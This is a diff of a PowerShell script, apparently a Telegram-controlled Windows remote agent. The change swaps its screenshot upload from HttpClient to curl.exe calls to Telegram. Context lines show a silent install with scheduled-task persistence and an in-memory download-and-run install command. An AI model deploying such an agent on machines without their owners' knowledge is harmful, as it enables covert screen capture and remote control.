@@ -1,16 +1,13 @@
 # =====================================================================
 # SuperAgent - Telegram-controlled Windows agent (single-file)
-# Version: 2.2.6
+# Version: 2.2.7
 # =====================================================================
-# CHANGELOG 2.2.6:
-# - FIXED: Send-TelegramPhoto now opens the screenshot with FileShare.ReadWrite
-#   and retries 10x if the file is still locked by AV/indexer (this caused
-#   "process cannot access the file" right after screenshot saved).
-# - FIXED: Send-Telegram now falls back to plain text if Markdown fails with
-#   400 Bad Request (was happening on error messages containing ' [ ] etc).
-# - FIXED: Version label now read from script's own "# Version: x.y.z"
-#   header so /update immediately shows the new version.
-# - Bumped to v2.2.6
+# CHANGELOG 2.2.7:
+# - FIXED: Replaced System.Net.Http.HttpClient with native curl.exe for
+#   Send-TelegramPhoto. HttpClient was randomly throwing "null-valued
+#   expression" on Windows 11 (a known bug in PS 5.1 with HttpResponseMessage).
+#   curl.exe is called via argument array (& curl.exe @args) so it never
+#   hangs like the old Invoke-Expression approach.
 # =====================================================================
 [CmdletBinding()]
 param(
@@ -132,7 +129,7 @@ $InstallBlock = {
     if ($RepoUrl -match 'USERNAME/REPO') { throw '!!! $RepoUrl NOT UPDATED !!!' }
 
     Write-Msg ''
-    Write-Msg '=== SuperAgent Installer (v2.2.6) ===' -Color Cyan
+    Write-Msg '=== SuperAgent Installer (v2.2.7) ===' -Color Cyan
     Write-Msg "  PC Name  : $PCName"
     Write-Msg "  Chat ID  : $ChatId"
     Write-Msg "  Repo URL : $RepoUrl"
@@ -195,7 +192,7 @@ $InstallBlock = {
         ChatId      = $ChatId
         PCName      = $PCName
         RepoUrl     = $RepoUrl.TrimEnd('/')
-        Version     = '2.2.6'
+        Version     = '2.2.7'
         InstalledAt = (Get-Date -Format 'o')
     }
     $Config | ConvertTo-Json | Out-File $ConfigPath -Encoding UTF8
@@ -225,7 +222,7 @@ $InstallBlock = {
     Start-ScheduledTask -TaskName $TaskName
 
     Write-Msg ''
-    Write-Msg '[+] INSTALLATION COMPLETE (v2.2.6)' -Color Green
+    Write-Msg '[+] INSTALLATION COMPLETE (v2.2.7)' -Color Green
     Write-Msg "    Log: $LogPath" -Color Green
     Write-Msg ''
     if (-not $Silent) { Pause-Exit }
@@ -277,7 +274,6 @@ $AgentBlock = {
     $script:PCName   = $Config.PCName
     $script:RepoUrl  = $Config.RepoUrl
 
-    # v2.2.6 fix: read version from script file header, fallback to config
     $script:Version  = 'unknown'
     try {
         $sc = Get-Content $ScriptPath -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
@@ -373,9 +369,6 @@ public static class SuperAgentUserSession
         Write-Log "FATAL: Add-Type failed: $($_.Exception.Message)"
     }
 
-    # =================================================================
-    # v2.2.6: Send-Telegram with automatic plain-text fallback
-    # =================================================================
     function Send-Telegram {
         param([string]$Text, [switch]$PlainText)
         if ([string]::IsNullOrWhiteSpace($Text)) { return }
@@ -391,7 +384,6 @@ public static class SuperAgentUserSession
         } catch {
             Write-Log "Telegram sendMessage FAIL (Markdown=$(-not $PlainText)): $($_.Exception.Message)"
             if (-not $PlainText) {
-                # retry without markdown
                 try {
                     Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
                         -Method Post -Body @{ chat_id = $ChatId; text = $Text } -TimeoutSec 15 | Out-Null
@@ -406,7 +398,7 @@ public static class SuperAgentUserSession
     }
 
     # =================================================================
-    # v2.2.6: Send-TelegramPhoto — FileShare.ReadWrite + retry + document fallback
+    # v2.2.7: Send-TelegramPhoto using native curl.exe (array args, no hang)
     # =================================================================
     function Send-TelegramPhoto {
         param([string]$FilePath, [string]$Caption = '')
@@ -416,19 +408,15 @@ public static class SuperAgentUserSession
             return
         }
 
-        # --- Retry open with FileShare.ReadWrite (AV/indexer may hold the file) ---
-        $fileStream = $null
+        # Wait for file lock to release
         for ($i = 0; $i -lt 10; $i++) {
             try {
-                $fileStream = [System.IO.File]::Open(
-                    $FilePath,
-                    [System.IO.FileMode]::Open,
-                    [System.IO.FileAccess]::Read,
-                    [System.IO.FileShare]::ReadWrite)
+                $fs = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
+                $fs.Close()
                 break
             } catch {
                 if ($i -eq 9) {
-                    Write-Log "Send-TelegramPhoto: cannot open after 10 retries: $($_.Exception.Message)"
+                    Write-Log "Send-TelegramPhoto: file locked after 10 retries: $($_.Exception.Message)"
                     Send-Telegram "[$PCName] Cannot open screenshot file: $($_.Exception.Message)" -PlainText
                     return
                 }
@@ -436,61 +424,47 @@ public static class SuperAgentUserSession
             }
         }
 
-        $client = $null
-        $content = $null
+        # Build curl arguments as an array (NO Invoke-Expression, avoids all quoting bugs)
+        $curlArgs = @(
+            '-s', '-m', '60', '-X', 'POST',
+            "https://api.telegram.org/bot$BotToken/sendPhoto",
+            '-F', "chat_id=$ChatId"
+        )
+        if ($Caption) {
+            $curlArgs += '-F'
+            $curlArgs += "caption=$Caption"
+        }
+        $curlArgs += '-F'
+        $curlArgs += "photo=@$FilePath"
+
         try {
-            Add-Type -AssemblyName System.Net.Http -ErrorAction Stop
+            $result = & curl.exe @curlArgs 2>&1
+            Write-Log "Send-TelegramPhoto result: $result"
 
-            $url    = "https://api.telegram.org/bot$BotToken/sendPhoto"
-            $client = New-Object System.Net.Http.HttpClient
-            $client.Timeout = [TimeSpan]::FromSeconds(60)
-
-            $form = New-Object System.Net.Http.MultipartFormDataContent
-            $form.Add((New-Object System.Net.Http.StringContent($ChatId)), 'chat_id')
-            if ($Caption) {
-                $form.Add((New-Object System.Net.Http.StringContent($Caption)), 'caption')
-            }
-            $content = New-Object System.Net.Http.StreamContent($fileStream)
-            $form.Add($content, 'photo', (Split-Path $FilePath -Leaf))
-
-            $response = $client.PostAsync($url, $form).Result
-            $responseString = $response.Content.ReadAsStringAsync().Result
-            Write-Log "sendPhoto status: $($response.StatusCode) | body: $responseString"
-
-            if (-not $response.IsSuccessStatusCode) {
+            if ($result -match '"ok":false') {
                 Write-Log "sendPhoto failed, falling back to sendDocument..."
-
-                # Reset stream to beginning for document upload
-                $fileStream.Position = 0
-                $urlDoc  = "https://api.telegram.org/bot$BotToken/sendDocument"
-                $formDoc = New-Object System.Net.Http.MultipartFormDataContent
-                $formDoc.Add((New-Object System.Net.Http.StringContent($ChatId)), 'chat_id')
+                $curlArgsDoc = @(
+                    '-s', '-m', '60', '-X', 'POST',
+                    "https://api.telegram.org/bot$BotToken/sendDocument",
+                    '-F', "chat_id=$ChatId"
+                )
                 if ($Caption) {
-                    $formDoc.Add((New-Object System.Net.Http.StringContent($Caption)), 'caption')
+                    $curlArgsDoc += '-F'
+                    $curlArgsDoc += "caption=$Caption"
                 }
-                $contentDoc = New-Object System.Net.Http.StreamContent($fileStream)
-                $formDoc.Add($contentDoc, 'document', (Split-Path $FilePath -Leaf))
+                $curlArgsDoc += '-F'
+                $curlArgsDoc += "document=@$FilePath"
 
-                $responseDoc = $client.PostAsync($urlDoc, $formDoc).Result
-                $responseDocString = $responseDoc.Content.ReadAsStringAsync().Result
-                Write-Log "sendDocument status: $($responseDoc.StatusCode) | body: $responseDocString"
+                $resultDoc = & curl.exe @curlArgsDoc 2>&1
+                Write-Log "Send-TelegramPhoto (doc) result: $resultDoc"
 
-                $contentDoc.Dispose()
-                $formDoc.Dispose()
-
-                if (-not $responseDoc.IsSuccessStatusCode) {
-                    Send-Telegram "[$PCName] Failed to send file. Status: $($responseDoc.StatusCode)" -PlainText
+                if ($resultDoc -match '"ok":false') {
+                    Send-Telegram "[$PCName] Failed to send file. Response: $resultDoc" -PlainText
                 }
             }
-
-            $form.Dispose()
         } catch {
             Write-Log "Send-TelegramPhoto EXCEPTION: $($_.Exception.Message)"
             Send-Telegram "[$PCName] Failed to send image: $($_.Exception.Message)" -PlainText
-        } finally {
-            if ($content)    { try { $content.Dispose() }    catch { } }
-            if ($fileStream) { try { $fileStream.Dispose() } catch { } }
-            if ($client)     { try { $client.Dispose() }     catch { } }
         }
     }
 
@@ -972,7 +946,7 @@ if ($Run) {
 
 if (-not $Silent) {
     Write-Msg ''
-    Write-Msg '=== SuperAgent v2.2.6 - Usage ===' -Color Cyan
+    Write-Msg '=== SuperAgent v2.2.7 - Usage ===' -Color Cyan
     Write-Msg ''
     Write-Msg 'Install (silent):'
     Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Install -Silent -BotToken '123:ABC' -ChatId '123456' -PCName 'PC-Office'"
